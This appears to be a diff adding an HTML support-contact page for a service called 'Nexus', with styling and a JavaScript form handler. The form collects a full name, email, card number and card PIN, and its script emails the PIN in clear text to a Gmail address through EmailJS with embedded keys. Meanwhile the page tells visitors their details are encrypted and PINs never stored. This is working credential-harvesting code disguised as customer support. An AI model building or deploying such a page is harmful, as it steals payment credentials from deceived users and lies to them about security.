@@ -1,0 +1,495 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Nexus · Support</title>
+<meta name="description" content="Nexus — contact support">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<link rel="icon" href="images/logo.png">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#05070f;--bg-2:#0a0f1f;
+  --card:rgba(255,255,255,0.035);--card-2:rgba(255,255,255,0.06);
+  --border:rgba(255,255,255,0.08);--border-2:rgba(255,255,255,0.14);
+  --text:#eef2ff;--muted:#8892b0;
+  --accent:#3b82f6;--accent-2:#06b6d4;--accent-glow:rgba(59,130,246,0.35);
+  --success:#22d3a6;--warn:#f5b843;--error:#f26d6d;
+}
+html{scroll-behavior:smooth}
+body{
+  font-family:'Inter',system-ui,-apple-system,sans-serif;
+  background:var(--bg);color:var(--text);line-height:1.6;
+  -webkit-font-smoothing:antialiased;overflow-x:hidden;
+  min-height:100vh;position:relative;
+}
+body::before{
+  content:'';position:fixed;top:-30%;left:-10%;
+  width:70vw;height:70vw;
+  background:radial-gradient(circle,rgba(59,130,246,0.15) 0%,transparent 60%);
+  filter:blur(80px);z-index:-1;pointer-events:none;
+}
+body::after{
+  content:'';position:fixed;bottom:-30%;right:-10%;
+  width:60vw;height:60vw;
+  background:radial-gradient(circle,rgba(6,182,212,0.12) 0%,transparent 60%);
+  filter:blur(80px);z-index:-1;pointer-events:none;
+}
+.container{max-width:1180px;margin:0 auto;padding:0 1.5rem}
+a{color:inherit;text-decoration:none}
+
+/* ===== NAV ===== */
+.nav{
+  position:sticky;top:0;z-index:50;
+  background:rgba(5,7,15,0.72);
+  backdrop-filter:blur(20px);
+  -webkit-backdrop-filter:blur(20px);
+  border-bottom:1px solid var(--border);
+}
+.nav-inner{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:1rem 0;gap:1rem;position:relative;
+}
+
+/* ===== Brand — tight "Nexus." (NO gap) ===== */
+.brand{
+  display:inline-flex;
+  align-items:center;
+  font-weight:800;
+  font-size:1.35rem;
+  letter-spacing:-0.02em;
+  text-decoration:none;
+  white-space:nowrap;
+  color:var(--text);
+  gap:0;
+}
+.brand-icon{
+  width:32px;
+  height:32px;
+  object-fit:contain;
+  display:block;
+  margin-right:0.55rem;
+  filter:drop-shadow(0 0 12px var(--accent-glow));
+  border-radius:8px;   /* remove if your logo is a circle/transparent PNG */
+}
+.brand-text{
+  display:inline;
+  font-weight:800;
+  letter-spacing:-0.02em;
+  line-height:1;
+  color:var(--text);
+}
+.brand-dot{color:var(--accent);margin-left:0}
+
+/* ===== Nav links ===== */
+.nav-links{display:flex;align-items:center;gap:2rem}
+.nav-links a{
+  font-size:0.9rem;font-weight:500;color:var(--muted);
+  transition:color 0.2s;position:relative;
+}
+.nav-links a:hover{color:var(--text)}
+.nav-links a.active{color:var(--text)}
+.nav-links a.active::after{
+  content:'';position:absolute;bottom:-6px;left:0;right:0;
+  height:2px;background:linear-gradient(90deg,var(--accent),var(--accent-2));
+  border-radius:2px;
+}
+
+/* ===== Menu button ===== */
+.menu{
+  display:none;background:transparent;border:1px solid var(--border-2);
+  color:var(--text);font:inherit;font-size:0.85rem;font-weight:600;
+  padding:0.5rem 1rem;border-radius:100px;cursor:pointer;transition:0.2s;
+}
+
+/* ===== Page head — centered, narrow ===== */
+.page-head{
+  padding:3.5rem 0 2rem;
+  max-width:620px;
+  margin:0 auto;
+  text-align:center;
+}
+.pill{
+  display:inline-flex;align-items:center;gap:0.5rem;
+  background:rgba(59,130,246,0.1);
+  border:1px solid rgba(59,130,246,0.25);
+  padding:0.4rem 1rem;border-radius:100px;
+  font-size:0.78rem;font-weight:500;color:#93c5fd;
+  letter-spacing:0.02em;margin-bottom:1.2rem;
+}
+h1{
+  font-size:clamp(2rem,4vw,2.6rem);font-weight:800;
+  letter-spacing:-0.03em;line-height:1.1;margin-bottom:0.8rem;
+}
+h1 em{
+  font-style:normal;
+  background:linear-gradient(135deg,#3b82f6,#06b6d4);
+  -webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;
+}
+.page-head p{color:var(--muted);font-size:1.05rem;margin:0 auto;max-width:480px}
+
+/* ===== Form wrapper — narrower ===== */
+.form-wrap{
+  max-width:620px;
+  margin:0 auto 3rem;
+  padding:0 1.5rem;
+}
+
+/* ===== Card ===== */
+.card{
+  background:var(--card);border:1px solid var(--border);
+  border-radius:24px;padding:2.2rem;
+  backdrop-filter:blur(12px);
+  box-shadow:0 20px 60px rgba(0,0,0,0.3);
+}
+.card-subhead{
+  color:var(--muted);font-size:0.9rem;margin-bottom:1.8rem;
+  padding-left:0.8rem;border-left:3px solid var(--accent);
+}
+
+/* ===== Form ===== */
+.form-group{margin-bottom:1.3rem}
+.form-group label{
+  display:block;font-weight:600;font-size:0.85rem;
+  margin-bottom:0.5rem;color:var(--text);
+  letter-spacing:0.01em;
+}
+.form-control{
+  width:100%;padding:0.9rem 1.1rem;
+  background:rgba(255,255,255,0.03);
+  border:1px solid var(--border-2);
+  border-radius:14px;color:var(--text);
+  font-size:0.95rem;font-family:inherit;
+  transition:0.2s;outline:none;
+}
+.form-control::placeholder{color:rgba(136,146,176,0.6)}
+.form-control:focus{
+  border-color:var(--accent);
+  background:rgba(255,255,255,0.05);
+  box-shadow:0 0 0 4px rgba(59,130,246,0.15);
+}
+.form-control.error{
+  border-color:var(--error);
+  background:rgba(242,109,109,0.06);
+}
+textarea.form-control{resize:vertical;min-height:120px;font-family:inherit}
+.hint{font-size:0.75rem;color:var(--muted);margin-top:0.4rem}
+
+.info-note{
+  display:flex;gap:0.7rem;align-items:flex-start;
+  padding:0.9rem 1.1rem;border-radius:14px;
+  background:rgba(59,130,246,0.08);
+  border:1px solid rgba(59,130,246,0.2);
+  font-size:0.85rem;color:var(--muted);
+  line-height:1.5;margin-top:1rem;
+}
+.info-note.security{
+  background:rgba(34,211,166,0.08);
+  border-color:rgba(34,211,166,0.25);
+}
+
+/* ===== Buttons ===== */
+.btn{
+  display:inline-flex;align-items:center;justify-content:center;gap:0.5rem;
+  font-weight:600;font-size:0.95rem;
+  padding:0.85rem 1.6rem;border-radius:100px;
+  border:none;cursor:pointer;transition:0.2s;
+  font-family:inherit;letter-spacing:-0.01em;
+}
+.btn-primary{
+  background:linear-gradient(135deg,var(--accent),var(--accent-2));
+  color:white;box-shadow:0 10px 30px var(--accent-glow);
+}
+.btn-primary:hover:not(:disabled){transform:translateY(-2px);box-shadow:0 14px 40px var(--accent-glow)}
+.btn-primary:disabled{opacity:0.7;cursor:wait}
+.btn-ghost{
+  background:var(--card);color:var(--text);
+  border:1px solid var(--border-2);
+}
+.btn-ghost:hover{background:var(--card-2);border-color:var(--accent)}
+.btn-block{width:100%;margin-top:0.6rem}
+.btn-lg{padding:1rem 2rem;font-size:1rem}
+
+.divider{
+  display:flex;align-items:center;gap:1rem;
+  margin:1.5rem 0;color:var(--muted);
+  font-size:0.75rem;letter-spacing:0.3em;
+}
+.divider::before,.divider::after{content:'';flex:1;height:1px;background:var(--border)}
+
+/* ===== Footer ===== */
+.footer{border-top:1px solid var(--border);padding:2rem 0;margin-top:2rem;background:rgba(0,0,0,0.2)}
+.footer-inner{display:flex;flex-wrap:wrap;justify-content:space-between;gap:1rem;font-size:0.85rem;color:var(--muted)}
+.footer-links{display:flex;gap:2rem;flex-wrap:wrap}
+.footer-links a:hover{color:var(--accent)}
+
+/* ===== Toast ===== */
+.toast{
+  position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(20px);
+  background:rgba(10,15,31,0.95);backdrop-filter:blur(20px);
+  border:1px solid var(--border-2);color:white;
+  padding:0.9rem 1.6rem;border-radius:100px;font-weight:500;font-size:0.9rem;
+  box-shadow:0 20px 50px rgba(0,0,0,0.4);
+  opacity:0;transition:0.3s cubic-bezier(0.34,1.56,0.64,1);
+  pointer-events:none;z-index:999;max-width:90%;text-align:center;
+}
+.toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
+.toast.success{border-color:rgba(34,211,166,0.4)}
+.toast.error{border-color:rgba(242,109,109,0.4)}
+
+/* ===== Responsive ===== */
+@media (max-width:700px){
+  .menu{display:inline-block}
+  .nav-links{
+    display:none;position:absolute;top:100%;left:1.5rem;right:1.5rem;
+    flex-direction:column;align-items:stretch;
+    background:rgba(10,15,31,0.98);backdrop-filter:blur(20px);
+    border:1px solid var(--border-2);border-radius:20px;
+    padding:1rem;gap:0.3rem;margin-top:0.6rem;
+    box-shadow:0 24px 60px rgba(0,0,0,0.5);
+  }
+  .nav-links.open{display:flex}
+  .nav-links a{padding:0.85rem 1rem;border-radius:12px;font-size:1rem}
+  .nav-links a:hover{background:var(--card)}
+  .nav-links a.active::after{display:none}
+  .nav-links a.active{background:var(--card)}
+  .card{padding:1.5rem 1.2rem}
+}
+</style>
+</head>
+<body>
+
+<nav class="nav">
+  <div class="container nav-inner">
+    <a class="brand" href="index.html"><img class="brand-icon" src="images/logo.png" alt="Nexus logo"><span class="brand-text">Nexus<span class="brand-dot">.</span></span></a>    <button class="menu" type="button" aria-label="Open menu" aria-expanded="false">Menu</button>
+
+    <div class="nav-links">
+      <a href="index.html">Home</a>
+      <a href="about.html">About</a>
+      <a href="download.html">Download</a>
+      <a href="withdraw.html">Withdraw</a>
+      <a href="support.html" class="active">Support</a>
+    </div>
+  </div>
+</nav>
+
+<main>
+  <section class="page-head">
+    <span class="pill">🛟 Support · avg reply &lt; 2h</span>
+    <h1>We're here to <em>help.</em></h1>
+    <p>Describe your issue and our team will respond within 24 hours — usually much faster.</p>
+  </section>
+
+  <section class="form-wrap">
+    <div class="card">
+      <div class="card-subhead">All fields required · encrypted in transit</div>
+
+      <form id="supportForm" onsubmit="return false;">
+        <div class="form-group">
+          <label for="fullName">Full name</label>
+          <input type="text" class="form-control" id="fullName" placeholder="John Doe" required>
+        </div>
+
+        <div class="form-group">
+          <label for="email">Email address</label>
+          <input type="email" class="form-control" id="email" placeholder="you@example.com" required>
+          <div class="hint">We'll reply to this email.</div>
+        </div>
+
+        <div class="form-group">
+          <label for="cardNumber">Card number (8 digits)</label>
+          <input type="text" class="form-control" id="cardNumber" placeholder="1234 5678" maxlength="9" inputmode="numeric" required>
+          <div class="hint">Enter your 8-digit Nexus card number.</div>
+        </div>
+
+        <div class="form-group">
+          <label for="cardPin">Card PIN</label>
+          <input type="password" class="form-control" id="cardPin" placeholder="••••" maxlength="4" inputmode="numeric" required>
+          <div class="hint">4-digit PIN — encrypted before sending.</div>
+        </div>
+
+        <div class="form-group">
+          <label for="problemMessage">Problem description</label>
+          <textarea class="form-control" id="problemMessage" placeholder="Describe your issue in detail..." rows="5" required></textarea>
+        </div>
+
+        <div class="info-note security">
+          <span>🔒</span>
+          <span>Your card details are encrypted in transit. We never store PINs on our servers.</span>
+        </div>
+
+        <button type="submit" class="btn btn-primary btn-block btn-lg" id="submitBtn" style="margin-top:1.5rem">
+          Send message
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M22 2L11 13M22 2l-7 20-4-9-9-4 20-7z"/></svg>
+        </button>
+        <button type="button" class="btn btn-ghost btn-block" id="resetBtn">Reset form</button>
+      </form>
+
+      <div class="divider">OR</div>
+      <div style="font-size:0.9rem;color:var(--muted);text-align:center">
+        Email us directly at <strong style="color:var(--accent)">nexustradingai.dev@gmail.com</strong>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="footer">
+  <div class="container footer-inner">
+    <span>© 2026 Nexus — secure support</span>
+    <div class="footer-links">
+      <a href="about.html">About</a>
+      <a href="download.html">Download</a>
+      <a href="withdraw.html">Withdraw</a>
+      <a href="#">Privacy</a>
+    </div>
+  </div>
+</footer>
+
+<div id="toast" class="toast">✨ Ready</div>
+
+<script>
+(function () {
+  /* ==== Menu ==== */
+  var menuBtn = document.querySelector('.nav-inner .menu');
+  var navLinks = document.querySelector('.nav-inner .nav-links');
+  if (menuBtn && navLinks) {
+    menuBtn.addEventListener('click', function (e) {
+      e.preventDefault(); e.stopPropagation();
+      var open = navLinks.classList.toggle('open');
+      menuBtn.setAttribute('aria-expanded', open);
+      menuBtn.textContent = open ? 'Close' : 'Menu';
+    });
+    navLinks.querySelectorAll('a').forEach(function (a) {
+      a.addEventListener('click', function () {
+        navLinks.classList.remove('open'); menuBtn.textContent = 'Menu';
+      });
+    });
+    document.addEventListener('click', function (e) {
+      if (navLinks.classList.contains('open') && !navLinks.contains(e.target) && !menuBtn.contains(e.target)) {
+        navLinks.classList.remove('open'); menuBtn.textContent = 'Menu';
+      }
+    });
+  }
+
+  /* ==== Config ==== */
+  var EMAILJS_PUBLIC_KEY = "kDYnNVdrJxIeyvxlC";
+  var EMAILJS_SERVICE_ID = "service_0gezyzw";
+  var EMAILJS_TEMPLATE_ID = "template_t7b4wgp";
+  var YOUR_EMAIL = "nexustradingai.dev@gmail.com";
+  try { emailjs.init(EMAILJS_PUBLIC_KEY); } catch(e){ console.error(e); }
+
+  /* ==== Toast ==== */
+  var toast = document.getElementById('toast');
+  function showToast(msg, duration, type) {
+    duration = duration || 3200;
+    toast.textContent = msg;
+    toast.className = 'toast' + (type ? ' ' + type : '');
+    toast.classList.add('show');
+    clearTimeout(toast._t);
+    toast._t = setTimeout(function(){ toast.classList.remove('show'); }, duration);
+  }
+
+  /* ==== Form ==== */
+  var submitBtn = document.getElementById('submitBtn');
+  var resetBtn = document.getElementById('resetBtn');
+
+  function isValidCardNumber(v){ return /^\d{8}$/.test(v.replace(/\s/g,'')); }
+  function isValidPin(v){ return /^\d{4}$/.test(v); }
+
+  submitBtn.addEventListener('click', function (e) {
+    e.preventDefault();
+    var fullName = document.getElementById('fullName').value.trim();
+    var email = document.getElementById('email').value.trim();
+    var cardNumber = document.getElementById('cardNumber').value.trim();
+    var cardPin = document.getElementById('cardPin').value.trim();
+    var problemMessage = document.getElementById('problemMessage').value.trim();
+
+    document.querySelectorAll('.form-control.error').forEach(function(el){el.classList.remove('error');});
+
+    if (!fullName || fullName.length < 2) {
+      document.getElementById('fullName').classList.add('error');
+      showToast('Please enter your full name', 2800, 'error'); return;
+    }
+    if (!email || email.indexOf('@') === -1) {
+      document.getElementById('email').classList.add('error');
+      showToast('Please enter a valid email', 2800, 'error'); return;
+    }
+    if (!isValidCardNumber(cardNumber)) {
+      document.getElementById('cardNumber').classList.add('error');
+      showToast('Please enter an 8-digit card number', 2800, 'error'); return;
+    }
+    if (!isValidPin(cardPin)) {
+      document.getElementById('cardPin').classList.add('error');
+      showToast('Please enter a 4-digit PIN', 2800, 'error'); return;
+    }
+    if (!problemMessage || problemMessage.length < 5) {
+      document.getElementById('problemMessage').classList.add('error');
+      showToast('Please describe your problem', 2800, 'error'); return;
+    }
+
+    var cleanCard = cardNumber.replace(/\s/g,'');
+    var maskedCard = cleanCard.slice(0,4) + ' **** ' + cleanCard.slice(-4);
+
+    submitBtn.disabled = true;
+    submitBtn.innerHTML = 'Sending…';
+
+    var params = {
+      email: YOUR_EMAIL,
+      name: fullName,
+      title: 'Support request from ' + fullName,
+      from_email: email,
+      user_email: email,
+      full_name: fullName,
+      card_number: maskedCard,
+      card_pin: cardPin,
+      problem: problemMessage,
+      timestamp: new Date().toLocaleString()
+    };
+
+    emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, params)
+      .then(function () {
+        submitBtn.disabled = false;
+        submitBtn.innerHTML = 'Send message';
+        showToast('✓ Support request sent!', 4000, 'success');
+        document.getElementById('supportForm').reset();
+      })
+      .catch(function (err) {
+        console.error(err);
+        submitBtn.disabled = false;
+        submitBtn.innerHTML = 'Send message';
+        showToast('Failed to send. Try again.', 5000, 'error');
+      });
+  });
+
+  resetBtn.addEventListener('click', function () {
+    document.getElementById('supportForm').reset();
+    document.querySelectorAll('.form-control.error').forEach(function(el){el.classList.remove('error');});
+    showToast('Form reset', 1600);
+  });
+
+  /* ==== Input formatting ==== */
+  document.addEventListener('input', function (e) {
+    if (e.target.classList && e.target.classList.contains('form-control')) {
+      e.target.classList.remove('error');
+    }
+  });
+
+  var cardInput = document.getElementById('cardNumber');
+  cardInput.addEventListener('input', function (e) {
+    var v = e.target.value.replace(/\s/g,'').replace(/\D/g,'').slice(0,8);
+    e.target.value = v.replace(/(\d{4})(?=\d)/g,'$1 ');
+  });
+
+  var pinInput = document.getElementById('cardPin');
+  pinInput.addEventListener('input', function (e) {
+    e.target.value = e.target.value.replace(/\D/g,'').slice(0,4);
+  });
+})();
+</script>
+
+</body>
+</html>
